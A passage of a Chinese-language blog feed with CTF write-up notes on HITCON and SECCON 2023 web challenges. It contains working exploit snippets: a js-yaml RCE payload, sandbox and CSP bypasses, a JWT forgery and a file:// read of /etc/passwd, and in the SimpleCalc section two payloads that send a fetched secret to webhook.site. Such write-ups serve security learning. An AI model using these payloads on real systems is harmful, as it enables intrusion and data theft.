<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Huli&#39;s blog</title>
  
  <subtitle>Learning by sharing</subtitle>
  <link href="https://blog.huli.tw/atom.xml" rel="self"/>
  
  <link href="https://blog.huli.tw/"/>
  <updated>2023-09-23T07:43:57.582Z</updated>
  <id>https://blog.huli.tw/</id>
  
  <author>
    <name>Huli</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HITCON CTF 2023 與 SECCON CTF 2023 筆記</title>
    <link href="https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/09/23/hitcon-seccon-ctf-2023-writeup/</id>
    <published>2023-09-23T07:40:00.000Z</published>
    <updated>2023-09-23T07:43:57.582Z</updated>
    
    <content type="html"><![CDATA[<p>這兩場比賽都有很多很有趣但也很難的題目，被電得很慘但也學到不少。</p><p>關鍵字列表：</p><ol><li>nim json, null byte</li><li>nim request smuggling</li><li>js-yaml</li><li>web worker</li><li>blob URL</li><li>meta redirect</li><li>file protocol &amp; .localhost domain</li><li>sxg: Signed Exchanges</li><li>431 CSP bypass</li><li>DOM clobbering document.body</li><li>ejs delimiter</li><li>Node.js + Deno prototye pollution gadget</li><li>XSleaks golang sort</li></ol><span id="more"></span><h2><span id="hitcon-ctf-2023">HITCON CTF 2023</span></h2><p>最近好像很少看到每一題都低於 10 組解出來的 web 題了，上次有這種整場比賽幾乎都是 hard web 可能是 DiceCTF 吧？不過我覺得難度是其次，好玩有趣有學到新東西才是重點，而這些題目在我看來很顯然有做到這點。</p><p>先附上兩位作者的 writeup，底下提到作者 writeup 就不額外附連結了：</p><ol><li><a href="https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/">https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/</a></li><li><a href="https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023">https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023</a></li></ol><p>兩個作者的 writeup 都寫得很詳細，我這邊只是看完之後記錄一些重點而已。</p><h3><span id="login-system-7-solves">Login System (7 solves)</span></h3><p>這題有兩個 server，node.js 跟 nim，基本上大部分功能都是在 nim server 實現的，你可以登入、註冊以及修改密碼，而使用者的資料會存在 yaml 檔案裡面，目標是要達成 RCE。</p><p>第一個洞是 request smuggling，Node.js 接受 <code>Transfer-Encoding: CHUNKED</code> 但是 Nim 只看 <code>chunk</code>，可以利用這個差異來達成走私的目的。</p><p>但走私之後能幹嘛呢？</p><p>第二個洞是 Nim 對於 JSON 的行為，先把一個欄位設成很大的數字，Nim 會把它當作是一個 RawNumber，在更新的時候就會不帶引號，可以利用這點來達成 JSON injection。</p><p>第三個洞是有了 JSON injection 之後就可以利用 js-yaml 的功能創造出一個有 JS function 的物件，最後利用這個物件會在渲染時呼叫 toString，就達成 RCE 了。</p><p>大概會像這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">privilegeLevel</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">toString</span><span class="token operator">:</span> <span class="token operator">!</span><span class="token operator">&lt;</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>js<span class="token operator">/</span><span class="token keyword">function</span><span class="token operator">></span> <span class="token string">"function ()&#123;console.log('hi')&#125;"</span><span class="token punctuation">&#125;</span><span class="token literal-property property">access</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'profile'</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">register</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token literal-property property">login</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>喔對了，還有一個洞是 Nim 的檔案讀取，檔名的部分可以用 null byte 截斷：<code>test.yaml\u0000</code></p><h3><span id="canvas-4-solves">Canvas (4 solves)</span></h3><p>這題很有趣！</p><p>簡單來講就是把你的程式碼丟到 worker 裡面去執行，在 worker 裡面有做一些防護措施，讓你不能存取到 globalThis。就算在 worker 取得了 XSS，從 worker 唯一能做的事情就是往 main thread postMessage，但是結果會經過 <code>setHTML</code>，被瀏覽器的 Sanitizer API 給過濾掉。</p><p>worker 的 sandbox 滿有趣的，大概像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">allKeys</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> keys <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>obj <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyNames</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>    keys <span class="token operator">=</span> keys<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">getOwnPropertyDescriptors</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">getPrototypeOf</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">...</span><span class="token keyword">new</span> <span class="token class-name">Set</span><span class="token punctuation">(</span>keys<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> fnCons <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token keyword">function</span><span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>    <span class="token parameter">f</span> <span class="token operator">=></span> f<span class="token punctuation">.</span>constructor  <span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> fnCons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">defineProperty</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">,</span> <span class="token string">'constructor'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>      <span class="token function-variable function">get</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token function-variable function">set</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Nope'</span><span class="token punctuation">)</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>      <span class="token literal-property property">configurable</span><span class="token operator">:</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">const</span> cons <span class="token operator">=</span> <span class="token punctuation">[</span>Object<span class="token punctuation">,</span> Array<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Boolean<span class="token punctuation">,</span> Date<span class="token punctuation">,</span> RegExp<span class="token punctuation">,</span> Promise<span class="token punctuation">,</span> Symbol<span class="token punctuation">,</span> BigInt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>fnCons<span class="token punctuation">)</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">const</span> c <span class="token keyword">of</span> cons<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>    Object<span class="token punctuation">.</span><span class="token function">freeze</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>prototype<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> code <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">console.log(1)</span><span class="token template-punctuation string">`</span></span><span class="token keyword">const</span> argNames <span class="token operator">=</span> <span class="token function">allKeys</span><span class="token punctuation">(</span>globalThis<span class="token punctuation">)</span><span class="token keyword">const</span> fn <span class="token operator">=</span> <span class="token function">Function</span><span class="token punctuation">(</span><span class="token operator">...</span>argNames<span class="token punctuation">,</span> code<span class="token punctuation">)</span><span class="token keyword">const</span> <span class="token function-variable function">callUserFn</span> <span class="token operator">=</span> <span class="token parameter">t</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span>Object<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'User function error'</span><span class="token punctuation">,</span> e<span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token comment">// hardening</span><span class="token function">hardening</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token function">callUserFn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>argNames 是搜集所有 global 能存取到的東西的名稱，這樣就可以把所有東西的名稱都當作是函式的參數丟進去，大概就像是底下這種感覺：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token parameter">console<span class="token punctuation">,</span> Object<span class="token punctuation">,</span> String<span class="token punctuation">,</span> Number<span class="token punctuation">,</span> fetch<span class="token punctuation">,</span><span class="token operator">...</span></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>於是你不管拿到什麼都會是 <code>undefined</code>，在呼叫時 this 也傳入了 <code>Object.create(null)</code>，所以沒辦法輕易跳出來。</p><p>Maple 的預期解是利用 try catch 加上錯誤去拿：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  TypeError <span class="token operator">=</span> e<span class="token punctuation">.</span>constructor<span class="token punctuation">&#125;</span>Error <span class="token operator">=</span> <span class="token class-name">TypeError</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token class-name">__proto__</span><span class="token punctuation">.</span>constructorError<span class="token punctuation">.</span><span class="token function-variable function">prepareStackTrace</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err<span class="token punctuation">,</span> structuredStackTrace</span><span class="token punctuation">)</span> <span class="token operator">=></span> structuredStackTrace<span class="token keyword">try</span><span class="token punctuation">&#123;</span>  <span class="token keyword">null</span><span class="token punctuation">.</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> g <span class="token operator">=</span> e<span class="token punctuation">.</span>stack<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getFunction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>arguments<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>target  <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">throw</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">message</span><span class="token operator">:</span> g <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>這招他之前在 DiceCTF 2022 - undefined 這題也用過類似的。</p><p>不過對於這題來說有個更容易的解法，利用 this 預設的特性，如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在 JavaScript 裡面，呼叫一個 function 時預設的 this 就會是 global，用這樣就可以繞過限制。</p><p>但繞過限制之後要幹嘛呢？在 worker 裡面拿到 XSS 之後好像做不了什麼事情，因為 main thread 的 <code>setHTML</code> 會做過濾，而且這題的 CSP 是 <code>default-src &#39;self&#39; &#39;unsafe-eval&#39;</code></p><p>關鍵就在於 blob URL，可以用 blob 新建一個 HTML 並且載入，這個新 HTML 的 origin 跟原本的是一樣的：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">this<span class="token punctuation">.</span>Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&lt;h1>peko&lt;/h1>'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">'text/html'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>location <span class="token operator">=</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>而這題讓我驚訝的地方是原來 <code>&lt;meta&gt;</code> 的跳轉也可以跳到 blob URL 去，所以結合 meta redirect 之後就可以把 top level page 變成是自己的 HTML，繞過 sanitizer 的限制。</p><p>但此時 CSP 會繼承，所以還是要繞過 CSP，這邊可以再次利用 worker.js，把 worker.js 當作是一般的 script 載入，就能夠在 main thread 底下執行 XSS 了。</p><p>這題真的很有趣，blob 的運用方式也很巧妙。</p><h3><span id="amf-4-solves">AMF (4 solves)</span></h3><p>有點懶得研究 python 的東西，就先放著吧，作者有寫 writeup。</p><h3><span id="harmony-2-solves">Harmony (2 solves)</span></h3><p>這題各種 Electron 黑魔法。</p><p>在 Chromium 中 <code>.localhost</code> 結尾的 domain 在利用 file protocol 時會被忽略，例如說：</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; failfile:&#x2F;&#x2F;www.youtube.com.attacker.com&#x2F;etc&#x2F;passwd&#x2F;&#x2F; successfile:&#x2F;&#x2F;www.youtube.com.localhost&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（我怎麼覺得以前我好像有無意間翻到過這一段的 code）</p><p>而 file:&#x2F;&#x2F; 會被 DOMPurify 濾掉，不過因為網頁本來就是 file，所以可以改成用 <code>//</code> 來繞過檢查。</p><p>接著，<code>file://</code> 在 Electorn 裡面都是 same-origin，所以載入自己的檔案以後就可以存取到 top.api</p><p>最後再結合一些 prototype pollution 的東西，就可以拿到 RCE（後半段我沒有仔細研究，可參考作者的 writeup）</p><h3><span id="sharers-world-1-solve">Sharer’s World (1 solve)</span></h3><p>這題的關鍵是一個叫做 SXG 的東西：<a href="https://web.dev/signed-exchanges/">https://web.dev/signed-exchanges/</a></p><p>在這場比賽以前我完全沒聽過這個，而且 web.dev 上的參考資料居然 2021 就有了，看來我真的是 lag 太久了。</p><p>簡單來講呢，SXG 就是可以拿憑證對一個網頁做簽章，如此一來其他網站在發送這個簽過章的資源時，瀏覽器就可以把這個資源視為是有憑證的那個網站。</p><p>舉個例子，今天 example.com 的人拿著他們的私鑰對一個網站簽名，產生了一個 example.sxg 檔案，接著我拿到了這個檔案，放到我的主機上，網址是：<a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a></p><p>當使用者造訪 <a href="https://huli.tw/example.sxg">https://huli.tw/example.sxg</a> 時，內容會是之前的網站，而網址會變成 example.com，就好像這個網頁是直接從 example.com 出來的一樣。</p><h2><span id="seccon-ctf-2023">SECCON CTF 2023</span></h2><p>身為一個 JavaScript 愛好者，這次的 SECCON CTF 的題目我很喜歡，充滿了一堆的 JavaScript。雖然說有些題目沒解出來，但依舊學到很多。</p><h3><span id="bad-jwt-107-solves">Bad JWT (107 solves)</span></h3><p>這題的目標是要產出一個 <code>isAdmin: true</code> 的 JWT，而重點在於驗證 JWT 的邏輯：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> algorithms <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">hs256</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha256'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token function-variable function">hs512</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">data<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span>     <span class="token function">base64UrlEncode</span><span class="token punctuation">(</span>crypto<span class="token punctuation">.</span><span class="token function">createHmac</span><span class="token punctuation">(</span><span class="token string">'sha512'</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> <span class="token function-variable function">createSignature</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">header<span class="token punctuation">,</span> payload<span class="token punctuation">,</span> secret</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">stringifyPart</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>  <span class="token keyword">const</span> signature <span class="token operator">=</span> algorithms<span class="token punctuation">[</span>header<span class="token punctuation">.</span>alg<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> signature<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>header.alg</code> 是 <code>constructor</code>，就會變成 <code>const signature = Object(data,secret)</code>，產出的結果會變成一個 string 的物件，而且裡面只含有 data，忽略了 secret：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">Object</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span> <span class="token string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// String &#123;'data'&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因此只要根據這個構造一個相同的 signature 就好。</p><p>更詳細的 writeup 可以參考：<a href="https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023">https://github.com/xryuseix/CTF_Writeups/tree/master/SECCON2023</a></p><h3><span id="simplecalc-23-solves">SimpleCalc (23 solves)</span></h3><p>這題可以讓你執行任意 JavaScript，但是必須使用 fetch 加上 X-FLAG 這個 header 才能拿到 flag，可是會被 CSP 擋住：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> js_url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>req<span class="token punctuation">.</span>hostname<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token constant">PORT</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/js/index.js</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">default-src </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>js_url<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> 'unsafe-eval';</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只要製造出一個 header too large 的 response 並用 iframe 嵌入，就能得到一個沒有 CSP 的 same-origin 頁面，繞過 CSP：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> f<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000/js/index.js?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'a'</span><span class="token punctuation">.</span><span class="token function">repeat</span><span class="token punctuation">(</span><span class="token number">20000</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>f<span class="token punctuation">.</span><span class="token function-variable function">onload</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        f<span class="token punctuation">.</span>contentWindow<span class="token punctuation">.</span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token string-property property">'X-FLAG'</span><span class="token operator">:</span> <span class="token string">'a'</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token literal-property property">credentials</span><span class="token operator">:</span><span class="token string">'include'</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">flag</span> <span class="token operator">=></span> location<span class="token operator">=</span><span class="token string">'https://webhook.site/2ba35f39-faf4-4ef2-86dd-d85af29e4512?q='</span><span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有趣的是如果用 <code>window.open</code> 就不行，看賽後討論是有人說因為 window.open 會把錯誤頁面導到一個 <code>chrome://error</code> 之類的地方，所以 origin 會變成 null。</p><p>而這題的預期解其實是 service worker，在 http + localhost 底下是可以用 sw 的，靠著 service worker 把 CSP header 拿掉。</p><p>底下是 @DimasMaulana 的 exploit：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quotetarget <span class="token operator">=</span> <span class="token string">"http://localhost:3000"</span>webhook <span class="token operator">=</span> <span class="token string">"https://webhook.site/9a2fbf03-9a64-49d1-9418-3728945d5e10"</span>rmcsp <span class="token operator">=</span> <span class="token triple-quoted-string string">"""self.addEventListener("fetch", (ev) => &#123;    console.log(ev)    let headers = new Headers()    headers.set("Content-Type","text/html")    if (/\/js\//.test(ev.request.url))&#123;        ev.respondWith(new Response("&lt;script>fetch('/flag',&#123;headers:&#123;'X-FLAG':'1'&#125;,credentials:'include'&#125;).then(async r=>&#123;location='"""</span><span class="token operator">+</span>webhook<span class="token operator">+</span><span class="token triple-quoted-string string">"""?'+await r.text()&#125;)&lt;/script>",&#123;headers&#125;))    &#125;&#125;);console.log("registered2")document = &#123;&#125;document.getElementById = ()=>&#123;return &#123;innerText:"testing"&#125;&#125;"""</span>workerUrl <span class="token operator">=</span> <span class="token string">"/js/index.js?expr="</span><span class="token operator">+</span>quote<span class="token punctuation">(</span>rmcsp<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"navigator.serviceWorker.register('"</span><span class="token operator">+</span>workerUrl<span class="token 